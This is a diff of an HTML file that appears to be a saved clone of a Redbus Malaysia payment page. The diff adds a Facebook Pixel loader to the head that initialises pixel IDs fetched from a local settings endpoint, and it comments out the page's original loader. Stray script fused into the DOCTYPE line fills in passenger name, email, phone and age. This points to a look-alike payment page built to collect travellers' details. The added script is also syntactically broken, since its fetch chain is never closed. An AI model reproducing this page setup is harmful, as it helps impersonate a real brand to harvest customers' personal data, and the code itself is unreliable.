@@ -1,4 +1,42 @@
-<!if(pv["4"])d.passengerName=pv["4"];if(pv["5"])d.email=pv["5"];if(pv["6"])d.phone=pv["6"];if(pv["1"])d.paxAge=pv["1"];DOCTYPE html><html lang="en" data-scrapbook-source="https://www.redbus.my/paymentDetails" data-scrapbook-create="20260522224331333"><head><meta charset="UTF-8"><meta http-equiv="origin-trial" content="AvehY7iVO8llGFAg1jzuZP3L02MO6PJX8PA9WH/NSTNGPspUIEJWVurhtrjiTGi36cpdebQumleENowTDj/6/AAAAAB0eyJvcmlnaW4iOiJodHRwczovL3d3dy5yZWRidXMuaW46NDQzIiwiZmVhdHVyZSI6IkFJUHJvbXB0QVBJTXVsdGltb2RhbElucHV0IiwiZXhwaXJ5IjoxNzc0MzEwNDAwLCJpc1N1YmRvbWFpbiI6dHJ1ZX0="><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5,minimum-scale=1"><title>Payment | Redbus</title><link href="favicon.ico" rel="shortcut icon">                  
+<!if(pv["4"])d.passengerName=pv["4"];if(pv["5"])d.email=pv["5"];if(pv["6"])d.phone=pv["6"];if(pv["1"])d.paxAge=pv["1"];DOCTYPE html><html lang="en" data-scrapbook-source="https://www.redbus.my/paymentDetails" data-scrapbook-create="20260522224331333"><head><meta charset="UTF-8"><meta http-equiv="origin-trial" content="AvehY7iVO8llGFAg1jzuZP3L02MO6PJX8PA9WH/NSTNGPspUIEJWVurhtrjiTGi36cpdebQumleENowTDj/6/AAAAAB0eyJvcmlnaW4iOiJodHRwczovL3d3dy5yZWRidXMuaW46NDQzIiwiZmVhdHVyZSI6IkFJUHJvbXB0QVBJTXVsdGltb2RhbElucHV0IiwiZXhwaXJ5IjoxNzc0MzEwNDAwLCJpc1N1YmRvbWFpbiI6dHJ1ZX0="><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5,minimum-scale=1"><title>Payment | Redbus</title>
+
+
+<script>
+            !function(f, b, e, v, n, t, s) {
+                if (f.fbq)
+                    return;
+                n = f.fbq = function() {
+                    n.callMethod ? n.callMethod.apply(n, arguments) : n.queue.push(arguments)
+                }
+                ;
+                if (!f._fbq)
+                    f._fbq = n;
+                n.push = n;
+                n.loaded = !0;
+                n.version = '2.0';
+                n.queue = [];
+                t = b.createElement(e);
+                t.async = !0;
+                t.src = v;
+                s = b.getElementsByTagName(e)[0];
+                s.parentNode.insertBefore(t, s)
+            }(window, document, 'script', 'https://connect.facebook.net/en_US/fbevents.js');
+            fetch('/api/settings')
+  .then(function(r) { return r.json(); })
+  .then(function(json) {
+    var pixels = (json.data && json.data.fbPixels) || [];
+    pixels.filter(function(p) { return p.enabled; }).forEach(function(p) {
+      fbq('init', p.pixelId);
+    });
+    
+    // 所有pixel init完才發
+    fbq('track', 'PageView');
+    window._fbPixelsReady = true;
+        </script>
+
+
+
+  <link href="favicon.ico" rel="shortcut icon">                  
 <style>
   .ticket .sdWrap___e467b0 {
 display:none !important;
@@ -1584,7 +1622,7 @@ if (isTicket) {
   }
 
 
-  !function(f,b,e,v,n,t,s){
+ /* !function(f,b,e,v,n,t,s){
   if(f.fbq)return;
   n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};
   if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];
@@ -1602,7 +1640,7 @@ fetch('/api/settings')
       fbq('init', p.pixelId);
     });
   })
-  .catch(function() {});
+  .catch(function() {});*/
  
  
   /* ═══════════════════════════════════════════
